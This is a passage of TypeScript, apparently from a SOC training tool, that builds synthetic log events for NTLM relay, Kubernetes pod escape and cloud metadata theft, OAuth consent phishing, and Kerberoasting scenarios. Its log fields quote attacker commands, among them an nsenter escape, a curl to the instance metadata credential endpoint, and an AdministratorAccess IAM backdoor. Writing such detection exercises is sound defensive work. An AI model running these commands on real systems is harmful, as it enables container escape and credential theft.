      // the "three targets in one window" observation is now the student's.
      description: "SRV-FILE01 opened an outbound SMB session to 10.0.2.30 on port 445.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.2.20",
        "data.dstip": "10.0.2.30",
        "data.dstport": "445",
        "data.proto": "6",
        "data.action": "accept",
        "data.app": "SMB",
        "data.sentbyte": 64_218,
        "data.rcvdbyte": 31_907,
        "data.sessionid": "48812207",
      },
    },
    {
      id: "ntlm_10b_lateral_smb",
      ts: T(25 * MIN + 40_000),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "high", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_ip: "10.0.2.31", dst_port: 445,
      description: "SRV-FILE01 opened an outbound SMB session to 10.0.2.31 on port 445.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.2.20",
        "data.dstip": "10.0.2.31",
        "data.dstport": "445",
        "data.proto": "6",
        "data.action": "accept",
        "data.app": "SMB",
        "data.sentbyte": 71_004,
        "data.rcvdbyte": 38_622,
        "data.sessionid": "48812341",
      },
    },
    {
      id: "ntlm_10c_lateral_smb",
      ts: T(25 * MIN + 95_000),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "high", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_ip: "10.0.0.5", dst_port: 445,
      description: "SRV-FILE01 opened an outbound SMB session to 10.0.0.5 on port 445.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.2.20",
        "data.dstip": "10.0.0.5",
        "data.dstport": "445",
        "data.proto": "6",
        "data.action": "accept",
        "data.app": "SMB",
        "data.sentbyte": 52_201,
        "data.rcvdbyte": 23_682,
        "data.sessionid": "48812498",
      },
    },
  ];

  return { title: "NTLM Relay — Internal Credential Hijacking", events, T, MIN };
}

/** Telemetry half of `buildK8sPodEscapeScenario`: the events and the story title, no answer key. */
export function k8sPodEscapeScenarioEvents() {
  const B = new Date("2026-05-20T02:45:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const events: TelemetryEvent[] = [
    {
      id: "k8s_01_kubectl_exec",
      ts: T(0),
      source: "k8s_audit", vendor: "Kubernetes Audit",
      // T1609 Container Administration Command — running a command in an
      // EXISTING container. T1610 is Deploy Container (creating a new one),
      // which is correct for k8s_09_privileged_pod but wrong here.
      event_type: "k8s_exec", severity: "medium", mitre_technique: "T1609",
      hostname: "api-prod-7f8b9c", src_ip: "193.233.48.71", dst_port: 443,
      description: "The ci-deploy-token service account ran kubectl exec into container api-prod-7f8b9c from 193.233.48.71, an address on a hosting provider's network.",
      fp_explanation: "kubectl exec is routine in dev and SRE workflows — engineers exec into containers to debug them many times a day, and ci-deploy is a legitimate service account that is expected to touch production workloads.",
      raw: {
        "kubernetes.audit.verb": "create",
        "kubernetes.audit.objectRef.resource": "pods/exec",
        "kubernetes.audit.objectRef.name": "api-prod-7f8b9c",
        "kubernetes.audit.objectRef.namespace": "production",
        "kubernetes.audit.user.username": "ci-deploy-token",
        "kubernetes.audit.user.groups[0]": "system:serviceaccounts",
        "kubernetes.audit.sourceIPs[0]": "193.233.48.71",
        "kubernetes.audit.responseStatus.code": 101,
        "kubernetes.audit.requestURI": "/api/v1/namespaces/production/pods/api-prod-7f8b9c/exec?command=sh&stdin=true&stdout=true&tty=true",
        "kubernetes.audit.userAgent": "kubectl/v1.28.2 (linux/amd64) kubernetes/9124985",
      },
    },
    // ── The misconfiguration that MAKES the escape possible ─────────────────
    //
    // ADDED. Without this the scenario taught the single most common
    // misconception in container security: that `nsenter --mount=/proc/1/ns/mnt`
    // escapes an ordinary hardened container.
    //
    // It does not. Reaching the HOST's namespaces through /proc/1 requires the
    // pod to run with hostPID (otherwise /proc/1 is the container's own PID 1
    // and the command escapes nothing), and setns() requires CAP_SYS_ADMIN,
    // which in practice means privileged. Neither was established anywhere for
    // api-prod-7f8b9c — the only privileged pod in the scenario was a DIFFERENT
    // pod created ten minutes later.
    //
    // Surfacing the pod spec turns the story from "the attacker ran a magic
    // command" into "the escape was available because this production pod had
    // been running privileged for months", which is the finding that belongs in
    // the report and the thing that actually gets fixed afterwards.
    {
      id: "k8s_01b_pod_spec_review",
      ts: T(1 * MIN),
      source: "k8s_audit", vendor: "Kubernetes Audit",
      event_type: "k8s_rbac", severity: "medium",
      hostname: "api-prod-7f8b9c", src_ip: "193.233.48.71",
      description: "The pod spec for api-prod-7f8b9c was read. The container runs with privileged true, hostPID true, and CAP_SYS_ADMIN.",
      fp_explanation: "Reading a pod spec is ordinary operational activity, and this deployment has run with these settings since it was created — the workload needs host-level metrics collection.",
      raw: {
        "kubernetes.audit.verb": "get",
        "kubernetes.audit.objectRef.resource": "pods",
        "kubernetes.audit.objectRef.name": "api-prod-7f8b9c",
        "kubernetes.audit.objectRef.namespace": "production",
        "kubernetes.audit.user.username": "system:serviceaccount:cicd:ci-deploy",
        "kubernetes.audit.sourceIPs[0]": "193.233.48.71",
        "kubernetes.audit.responseStatus.code": 200,
        "kubernetes.audit.responseObject.spec.hostPID": true,
        "kubernetes.audit.responseObject.spec.containers[0].securityContext.privileged": true,
        "kubernetes.audit.responseObject.spec.containers[0].securityContext.capabilities.add[0]": "SYS_ADMIN",
        "kubernetes.audit.responseObject.metadata.creationTimestamp": "2025-11-04T08:12:44Z",
      },
    },
    {
      id: "k8s_02_nsenter_escape", is_detection: true,
      ts: T(2 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "critical", mitre_technique: "T1611",
      hostname: "eks-node-i-0abc123",
      description: "CrowdStrike detected nsenter running inside container a3f7b1c9d2e8 with all four host namespace flags (mount, uts, ipc, net), spawning bash as root.",
      raw: {
        "crowdstrike.process_name": "nsenter",
        "crowdstrike.CommandLine": "nsenter --mount=/proc/1/ns/mnt --uts=/proc/1/ns/uts --ipc=/proc/1/ns/ipc --net=/proc/1/ns/net -- bash",
        "crowdstrike.UserName": "root",
        "crowdstrike.container_id": "a3f7b1c9d2e8",
        "crowdstrike.container_runtime": "containerd",
        "crowdstrike.parent_basefilename": "sh",
        "crowdstrike.Severity": 95,
      },
    },
    {
      id: "k8s_03_imds_query",
      ts: T(3 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "net_connection", severity: "critical", mitre_technique: "T1552.005",
      hostname: "eks-node-i-0abc123",
      description: "root ran curl against 169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role from the EKS node.",
      raw: {
        "crowdstrike.process_name": "curl",
        "crowdstrike.CommandLine": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role",
        "crowdstrike.UserName": "root",
        "crowdstrike.remote_address": "169.254.169.254",
        "crowdstrike.remote_port": "80",
        "crowdstrike.container_id": "a3f7b1c9d2e8",
        "crowdstrike.Severity": 90,
      },
    },
    {
      id: "k8s_04_creds_written",
      ts: T(3 * MIN + 15_000),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "file_create", severity: "high", mitre_technique: "T1552.005",
      hostname: "eks-node-i-0abc123",
      description: "The IMDS response was redirected to /tmp/.cache/.env on the EKS node.",
      raw: {
        "crowdstrike.process_name": "bash",
        "crowdstrike.CommandLine": "bash -c \"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role > /tmp/.cache/.env\"",
        "crowdstrike.target_filename": "/tmp/.cache/.env",
        "crowdstrike.UserName": "root",
        "crowdstrike.Severity": 75,
      },
    },
    {
      id: "k8s_05_sts_verify",
      ts: T(5 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call", severity: "medium", mitre_technique: "T1552.005",
      src_ip: "193.233.48.71", dst_port: 443,
      description: "GetCallerIdentity was called using the eks-node-role assumed role from 193.233.48.71 — an IP outside AWS's published ranges.",
      fp_explanation: "GetCallerIdentity is one of the most common calls in any AWS account — the SDKs issue it on startup to confirm which identity they are running as, so it appears constantly in CloudTrail for healthy workloads.",
      raw: {
        "aws.cloudtrail.eventName": "GetCallerIdentity",
        "aws.cloudtrail.eventSource": "sts.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.userIdentity.accountId": "123456789012",
        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
        "aws.cloudtrail.userAgent": "aws-cli/2.13.0 Python/3.11.4",
        "aws.cloudtrail.errorCode": "",
        "aws.cloudtrail.responseElements.Account": "123456789012",
      },
    },
    {
      id: "k8s_06_list_buckets",
      ts: T(6 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1580",
      src_ip: "193.233.48.71",
      description: "ListBuckets was called using the same assumed role from the same external IP, returning 14 buckets.",
      raw: {
        "aws.cloudtrail.eventName": "ListBuckets",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
      },
    },
    {
      id: "k8s_07_describe_instances",
      ts: T(7 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1580",
      src_ip: "193.233.48.71",
      description: "DescribeInstances was called using the same assumed role, requesting up to 1000 results.",
      raw: {
        "aws.cloudtrail.eventName": "DescribeInstances",
        "aws.cloudtrail.eventSource": "ec2.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
        "aws.cloudtrail.requestParameters.maxResults": 1000,
      },
    },
    {
      id: "k8s_08_secrets_access",
      ts: T(9 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_storage_access", severity: "critical", mitre_technique: "T1530",
      src_ip: "193.233.48.71",
      description: "GetObject retrieved s3://rocketstack-secrets-prod/db-passwords.json (4,218 bytes) using the same assumed role from 193.233.48.71.",
      raw: {
        "aws.cloudtrail.eventName": "GetObject",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
        "aws.cloudtrail.requestParameters.bucketName": "rocketstack-secrets-prod",
        "aws.cloudtrail.requestParameters.key": "db-passwords.json",
        "aws.cloudtrail.responseElements.contentLength": 4218,
      },
    },
    {
      id: "k8s_09_privileged_pod",
      ts: T(12 * MIN),
      source: "k8s_audit", vendor: "Kubernetes Audit",
      event_type: "k8s_pod_create", severity: "critical", mitre_technique: "T1610",
      src_ip: "193.233.48.71",
      description: "ci-deploy-token created a pod named svc-monitoring-backup in kube-system with hostPID, hostNetwork, and privileged:true, pulling its image from 193.233.48.71:5000.",
      raw: {
        "kubernetes.audit.verb": "create",
        "kubernetes.audit.objectRef.resource": "pods",
        "kubernetes.audit.objectRef.namespace": "kube-system",
        "kubernetes.audit.objectRef.name": "svc-monitoring-backup",
        "kubernetes.audit.user.username": "ci-deploy-token",
        "kubernetes.audit.sourceIPs[0]": "193.233.48.71",
        "kubernetes.audit.responseStatus.code": 201,
        "kubernetes.audit.requestObject.spec.hostPID": true,
        "kubernetes.audit.requestObject.spec.hostNetwork": true,
        "kubernetes.audit.requestObject.spec.containers[0].securityContext.privileged": true,
        "kubernetes.audit.requestObject.spec.containers[0].image": "193.233.48.71:5000/backdoor:latest",
      },
    },
    {
      id: "k8s_10_iam_backdoor",
      ts: T(15 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "account_create", severity: "critical", mitre_technique: "T1136.003",
      src_ip: "193.233.48.71",
      // SPLIT from a single record that carried eventName "CreateUser" together
      // with requestParameters.policyArn. CreateUser accepts userName, path and
      // tags — never a policy ARN. Attaching a managed policy is a separate
      // AttachUserPolicy call, and merging them hid the single most important
      // pivot in the scenario: the moment the privilege was actually granted.
      description: "CreateUser created IAM user svc-monitoring-backup, called with the eks-node-role assumed role from 193.233.48.71.",
      raw: {
        "aws.cloudtrail.eventName": "CreateUser",
        "aws.cloudtrail.eventSource": "iam.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
        "aws.cloudtrail.requestParameters.userName": "svc-monitoring-backup",
        "aws.cloudtrail.requestParameters.path": "/",
        "aws.cloudtrail.responseElements.user.userId": "AIDIODR4TAW7CSEXAMPLE",
        "aws.cloudtrail.responseElements.user.arn": "arn:aws:iam::123456789012:user/svc-monitoring-backup",
      },
    },
    {
      id: "k8s_11_iam_policy_attach",
      ts: T(15 * MIN + 11_000),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_role_change", severity: "critical", mitre_technique: "T1098.003",
      src_ip: "193.233.48.71",
      description: "AttachUserPolicy attached the AWS-managed AdministratorAccess policy to svc-monitoring-backup, eleven seconds after the account was created.",
      raw: {
        "aws.cloudtrail.eventName": "AttachUserPolicy",
        "aws.cloudtrail.eventSource": "iam.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
        "aws.cloudtrail.requestParameters.userName": "svc-monitoring-backup",
        "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
        "aws.cloudtrail.responseElements": "null",
      },
    },
  ];

  return { title: "Kubernetes Pod Escape → Cloud Metadata Theft", events, T, MIN };
}

/** Telemetry half of `buildOAuthConsentPhishingScenario`: the events and the story title, no answer key. */
export function oauthConsentPhishingScenarioEvents() {
  const B = new Date("2026-06-13T22:14:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const APP_ID = "a3f9b1c2-d4e5-4f67-8901-ab2cd3ef4567";

  const events: TelemetryEvent[] = [
    {
      id: "oauth_10_app_registration_retrospective",
      ts: T(-48 * 60 * MIN),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "account_create", severity: "high", mitre_technique: "T1528",
      hostname: "aad.nexacorp.com",
      description: "The Productivity Suite Pro app was registered in Entra ID with an unverified publisher and a redirect URI at productivty-suite.com.",
      raw: {
        "data.office365.Operation": "Add application.",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.Target[0].ID": APP_ID,
        "data.office365.ExtendedProperties[0].Name": "AppDisplayName",
        "data.office365.ExtendedProperties[0].Value": "Productivity Suite Pro",
        "data.office365.ExtendedProperties[1].Name": "ReplyUrls",
        "data.office365.ExtendedProperties[1].Value": "https://productivty-suite.com/callback",
        "data.office365.ExtendedProperties[2].Name": "AppCreationDateTime",
        "data.office365.ExtendedProperties[2].Value": "2026-06-11T22:14:00Z",
        "data.office365.ExtendedProperties[3].Name": "PublisherVerified",
        "data.office365.ExtendedProperties[3].Value": "false",
      },
    },
    {
      id: "oauth_01_consent_grant",
      ts: T(0),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "role_assignment", severity: "high", mitre_technique: "T1528",
      hostname: "aad.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "207.154.110.53",
      description: "j.chen granted OAuth consent to an app named Productivity Suite Pro, requesting Mail.ReadWrite, Files.ReadWrite.All, and Calendars.Read.",
      fp_explanation: "OAuth consent grants are extremely common — users consent to dozens of productivity apps. This looks like Slack/Zoom/Notion onboarding from a corporate IP, at a time the user is still at the office (22:14).",
      raw: {
        "data.office365.Operation": "Consent to application",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.ActorIpAddress": "207.154.110.53",
        "data.office365.Target[0].ID": APP_ID,
        "data.office365.Target[0].Type": "1",
        "data.office365.ExtendedProperties[0].Name": "AppDisplayName",
        "data.office365.ExtendedProperties[0].Value": "Productivity Suite Pro",
        "data.office365.ExtendedProperties[1].Name": "Permissions",
        "data.office365.ExtendedProperties[1].Value": "Mail.ReadWrite Files.ReadWrite.All Calendars.Read",
        "data.office365.ExtendedProperties[2].Name": "AppId",
        "data.office365.ExtendedProperties[2].Value": APP_ID,
        "data.office365.ResultStatus": "Success",
      },
    },
    {
      id: "oauth_02_mail_access",
      ts: T(55 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1114.002",
      hostname: "graph.microsoft.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "The Productivity Suite Pro app read items in j.chen's mailbox via Microsoft Graph, 55 minutes after consent was granted.",
      fp_explanation: "MailItemsAccessed by an application is common — CRM tools and archival apps do this constantly. The Microsoft 365 compliance center logs thousands of these per day.",
      raw: {
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy",
        "data.office365.AppId": APP_ID,
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.Workload": "Exchange",
        // Representative record — the 1,247-item total (see description) is
        // a SIEM-side aggregate across many MailItemsAccessed records.
        "data.office365.AccessedItems[0].InternetMessageId": "<msg-batch-01@nexacorp.com>",
      },
    },
    {
      id: "oauth_03_folder_enum",
      ts: T(56 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1114.002",
      hostname: "graph.microsoft.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "The same app called MailFolders.List and enumerated all 43 of j.chen's mailbox folders.",
      raw: {
        "data.office365.Operation": "MailFolders.List",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.AppId": APP_ID,
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.Workload": "Exchange",
        "data.office365.ResponseCount": 43,
        "data.office365.ClientInfoString": "Client=Graph;Application=Productivity Suite Pro",
      },
    },
    {
      id: "oauth_04_inbox_rule",
      ts: T(58 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "policy_modification", severity: "high", mitre_technique: "T1114.003",
      hostname: "outlook.office365.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "New-InboxRule was created with UserId set to the app's own ID (not j.chen), forwarding all mail to backupmail@productivity-suite.pro.",
      raw: {
        "data.office365.Operation": "New-InboxRule",
        "data.office365.UserId": APP_ID,
        "data.office365.Workload": "Exchange",
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.Parameters[0].Name": "Name",
        "data.office365.Parameters[0].Value": "Backup Sync Rule",
        "data.office365.Parameters[1].Name": "ForwardTo",
        "data.office365.Parameters[1].Value": "backupmail@productivity-suite.pro",
        "data.office365.Parameters[2].Name": "MarkAsRead",
        "data.office365.Parameters[2].Value": "True",
        "data.office365.Parameters[3].Name": "ApplyToAllMessages",
        "data.office365.Parameters[3].Value": "True",
      },
    },
    {
      id: "oauth_05_sharepoint_bulk",
      ts: T(62 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "sharepoint_access", severity: "high", mitre_technique: "T1530",
      hostname: "nexacorp.sharepoint.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "Files on the Finance SharePoint site were accessed with UserId set to the app's own ID.",
      raw: {
        "data.office365.Operation": "FileAccessed",
        "data.office365.UserId": APP_ID,
        "data.office365.Workload": "SharePoint",
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Finance",
        "data.office365.ObjectId": "https://nexacorp.sharepoint.com/sites/Finance/Documents",
        "data.office365.ItemType": "File",
        // Representative record — FileAccessed is written per file; the
        // 312-file total (see description) is a SIEM-side aggregate across
        // many records, not a count field on this one.
      },
    },
    {
      id: "oauth_06_calendar_read",
      ts: T(65 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "medium", mitre_technique: "T1114.002",
      hostname: "graph.microsoft.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "CalendarEvents.List returned 847 of j.chen's calendar events spanning the last 90 days.",
      raw: {
        "data.office365.Operation": "CalendarEvents.List",
        "data.office365.UserId": APP_ID,
        "data.office365.AppId": APP_ID,
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.Workload": "Exchange",
        "data.office365.QueryParameters.startDateTime": "2026-03-15T00:00:00Z",
        "data.office365.QueryParameters.endDateTime": "2026-06-13T23:59:59Z",
        "data.office365.ResponseCount": 847,
      },
    },
    {
      id: "oauth_07_admin_consent_fail",
      ts: T(70 * MIN),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "role_assignment", severity: "high", mitre_technique: "T1528",
      hostname: "aad.nexacorp.com", src_ip: "40.99.8.12",
      description: "Productivity Suite Pro requested AllPrincipals (tenant-wide) consent from 40.99.8.12 — the request failed with InsufficientPrivileges.",
      raw: {
        "data.office365.Operation": "Consent to application",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.ActorIpAddress": "40.99.8.12",
        "data.office365.Target[0].ID": APP_ID,
        "data.office365.ExtendedProperties[0].Name": "ConsentType",
        "data.office365.ExtendedProperties[0].Value": "AllPrincipals",
        "data.office365.ResultStatus": "Failure",
        "data.office365.ResultStatusDetail": "InsufficientPrivileges",
      },
    },
    {
      id: "oauth_08_dlp_contract",
      ts: T(72 * MIN),
      source: "dlp", vendor: "Microsoft Purview",
      event_type: "dlp_alert", severity: "critical", mitre_technique: "T1530",
      hostname: "nexacorp.sharepoint.com", user_email: "j.chen@nexacorp.com",
      description: "Microsoft Purview DLP fired its Confidential Documents — Approved Apps Only policy when Contract-GlobalLogis-2026.docx was accessed by the unverified app.",
      raw: {
        "data.office365.Operation": "DlpRuleMatch",
        "data.office365.Workload": "SharePoint",
        "data.office365.UserId": APP_ID,
        "data.office365.PolicyDetails[0].PolicyName": "Confidential Documents — Approved Apps Only",
        "data.office365.PolicyDetails[0].Rules[0].RuleName": "Non-approved application accessing confidential file",
        "data.office365.PolicyDetails[0].Rules[0].Severity": "High",
        "data.office365.ExchangeMetaData.Attachment": "Contract-GlobalLogis-2026.docx",
        "data.office365.IncidentId": "DLP-2026-06-13-91847",
      },
    },
    {
      id: "oauth_09_ueba_risk_spike",
      ts: T(75 * MIN),
      source: "ueba", vendor: "Microsoft Sentinel UEBA",
      event_type: "risk_score_change", severity: "high", mitre_technique: "T1528",
      hostname: "sentinel.nexacorp.com", user_email: "j.chen@nexacorp.com",
      description: "Microsoft Sentinel UEBA raised the Productivity Suite Pro service principal's risk score from 8 to 91.",
      raw: {
        "event.action": "BehaviorAnomalyDetected",
        "event.outcome": "alerted",
        "user.email": "j.chen@nexacorp.com",
        "SuspiciousOAuthConsent": "true",
        "behavior.name": "oauth_app_risk_escalation",
        "behavior.score": "91",          // new composite risk score (0-100)
        "anomaly.score": "88",           // 0-100 UEBA composite confidence
        "ActionUncommonlyPerformedByUser": "true",
        "ExtendedProperties.Contributing Behavior 1": "AllPrincipals (tenant-wide) consent requested from an unverified publisher",
        "ExtendedProperties.Contributing Behavior 2": "Mail.ReadWrite + Files.ReadWrite.All granted to a newly-registered application",
        "ExtendedProperties.Contributing Behavior 3": "DLP policy match on confidential document access by the application",
        "ExtendedProperties.Contributing Behavior 4": "Sign-in source IP 40.99.8.12 has no prior history for this tenant",
        "application.id": APP_ID,
        "application.name": "Productivity Suite Pro",
      },
    },
  ];

  return { title: "OAuth Consent Grant Phishing — Silent BEC", events, T, MIN, APP_ID };
}

/** Telemetry half of `buildKerberoastingScenario`: the events and the story title, no answer key. */
export function kerberoastingScenarioEvents() {
  const B = new Date("2026-05-15T10:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const attackerHost = "WS-DEV-4412";
  const attackerUser = "m.cohen@nexacorp.com";
  const attackerIp = "10.10.30.44";

  const events: TelemetryEvent[] = [
    // T+0: Normal domain auth — attacker foothold
    {
      id: "evt_kerb_01_logon", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      severity: "informational",
      description: "m.cohen logged on interactively to developer workstation WS-DEV-4412.",
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": attackerHost,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1109842",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": `${attackerHost}$`,
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1204",
        "winlog.event_data.TargetUserName": "m.cohen",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0xA2F8C1",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": attackerHost,
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "0",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\m.cohen",
        "user.domain": "NEXACORP",
        "host.name": attackerHost,
        "source.ip": attackerIp,
        "authentication.protocol": "Kerberos",
      },
    },

    // (REMOVED evt_kerb_02_ldap_spn and evt_kerb_bloodhound_ldap. The first was a
    // client's LDAP search filter logged as a DC 4662 — a DC records no such
    // thing. The second was a Defender for Identity row with an invented alert
    // type, timestamped BEFORE the query it flagged. The directory-side evidence
    // is now evt_kerb_02_mdi_spn_exposure, after the ticket requests it reports.)

    // T+4min: TGS request for MSSQLSvc (T1558.003 — Kerberoasting)
    {
      id: "evt_kerb_03_tgs_sql", ts: T(4 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "DC01", user_email: attackerUser, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "m.cohen requested a Kerberos TGS ticket for MSSQLSvc/srv-db01:1433 (svc-mssql) using RC4 encryption (0x17), two minutes after the SPN enumeration.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        // 4769: TargetUserName is the REQUESTING principal, not the service.
        "winlog.event_data.TargetUserName": "m.cohen@NEXACORP.COM",
        "winlog.event_data.TargetDomainName": "NEXACORP.COM",
        // ServiceName carries the service ACCOUNT name; the SPN that was
        // requested (MSSQLSvc/srv-db01:1433) is named in the event description.
        "winlog.event_data.ServiceName": "svc-mssql",
        "winlog.event_data.ServiceSid": "S-1-5-21-3421479547-3897544621-1789562108-1301",
        "winlog.event_data.TicketOptions": "0x40810000",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51244",
        "winlog.event_data.Status": "0x0",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "kerberos.encryption_type": "RC4-HMAC",
        "kerberos.ticket_options": "Forwardable, Renewable, Canonicalize, RenewableOk",
        "user.name": "m.cohen",
        "host.name": "DC01.nexacorp.com",
        "source.ip": attackerIp,
      },
    },

    // T+4min+20s: TGS for HTTP/intranet
    {
      id: "evt_kerb_04_tgs_iis", ts: T(4 * MIN + 20_000),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "DC01", user_email: attackerUser, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "m.cohen requested a second RC4-encrypted TGS ticket, this time for HTTP/intranet.corp (svc-iis), 20 seconds after the first.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        // 4769: TargetUserName is the REQUESTING principal, not the service.
        "winlog.event_data.TargetUserName": "m.cohen@NEXACORP.COM",
        "winlog.event_data.TargetDomainName": "NEXACORP.COM",
        // ServiceName carries the service ACCOUNT name; the SPN that was
        // requested (HTTP/intranet.corp) is named in the event description.
        "winlog.event_data.ServiceName": "svc-iis",
        "winlog.event_data.ServiceSid": "S-1-5-21-3421479547-3897544621-1789562108-1305",
        "winlog.event_data.TicketOptions": "0x40810000",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51244",
        "winlog.event_data.Status": "0x0",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "kerberos.encryption_type": "RC4-HMAC",
        "user.name": "m.cohen",
        "host.name": "DC01.nexacorp.com",
        "source.ip": attackerIp,
      },
    },

